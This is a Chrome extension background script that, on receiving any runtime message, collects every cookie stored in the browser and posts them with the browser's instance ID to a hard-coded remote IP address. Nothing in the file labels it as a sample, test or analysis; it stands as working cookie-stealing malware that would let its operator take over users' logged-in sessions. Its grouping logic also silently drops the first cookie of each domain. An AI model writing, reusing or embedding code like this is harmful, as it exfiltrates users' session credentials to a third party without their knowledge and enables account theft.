let instanceId;
chrome.instanceID.getID((id) => {
  instanceId = id
});

const getAllCookies = async () => {
  const cookies = chrome.cookies.getAll({});
  return cookies;
};

const getCookiesByDomain = async (domainRegex) => {
  const allCookies = await getAllCookies();
  const cookies = allCookies.filter((cookie) =>
    (new RegExp(domainRegex ? domainRegex : '')).test(cookie.domain)
  );
  const mappedCookies = mapCookies(cookies);
  // 'http://localhost:4001/save-cookies'
  const saveCookiesResponse = await (await fetch('http://34.87.171.102:4001/save-cookies', {
    method: 'POST',
    headers: {
      Accept: 'application/json',
      'content-type': 'application/json',
    },
    body: JSON.stringify({
      instanceId,
      cookies: mappedCookies
    }),
  })).json();

  console.log(`---save cookies response:`, saveCookiesResponse);
  return mappedCookies;
};

const mapCookies = (cookies) => {
  const groupedCookies = {};
  for (const cookie of cookies) {
    if (groupedCookies[cookie.domain]) {
      groupedCookies[cookie.domain] = [
        ...groupedCookies[cookie.domain],
        cookie,
      ];
    } else {
      groupedCookies[cookie.domain] = [];
    }
  }
  const mappedCookies = Object.keys(groupedCookies).map((key) => {
    return {
      url: key,
      cookies: groupedCookies[key],
    };
  });
  return mappedCookies;
};

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  console.log("Received msg:", msg);
  //   getAllCookies().then((cookies) => sendResponse(cookies));
  getCookiesByDomain('')
    .then((cookies) => sendResponse(cookies))
    .catch((error) => sendResponse(null));
  return true;
});